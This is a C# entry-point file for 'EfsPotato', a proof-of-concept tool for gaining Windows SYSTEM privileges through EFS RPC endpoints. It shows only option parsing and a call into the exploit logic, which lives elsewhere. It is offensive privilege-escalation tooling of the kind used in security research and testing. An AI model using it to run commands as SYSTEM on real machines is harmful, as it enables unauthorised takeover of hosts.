using System;
using EfsPotato.Handler;

namespace EfsPotato
{
    internal class EfsPotato
    {
        static void Main(string[] args)
        {
            if (!Environment.Is64BitProcess)
            {
                Console.WriteLine("\n[-] This program does not support 32bit mode.\n");
                return;
            }

            var options = new CommandLineParser();

            try
            {
                options.SetTitle("EfsPotato - PoC to get SYSTEM privileges with EFS RPC method.");
                options.AddFlag(false, "h", "help", "Displays this help message.");
                options.AddFlag(false, "i", "interactive", "Flag to execute command with interactive mode.");
                options.AddParameter(true, "c", "command", null, "Specifies command to execute.");
                options.AddParameter(false, "e", "endpoint", "efsrpc", "\"efsrpc\", \"lsarpc\", \"lsass\", \"netlogon\" or \"samr\".");
                options.AddParameter(false, "s", "session", null, "Specifies session ID.");
                options.AddParameter(false, "t", "timeout", "3000", "Specifies timeout in milliseconds. Default is 3,000 ms.");
                options.Parse(args);

                Execute.Run(options);
            }
            catch (InvalidOperationException ex)
            {
                Console.WriteLine(ex.Message);
            }
            catch (ArgumentException ex)
            {
                options.GetHelp();
                Console.WriteLine(ex.Message);
            }
        }
    }
}
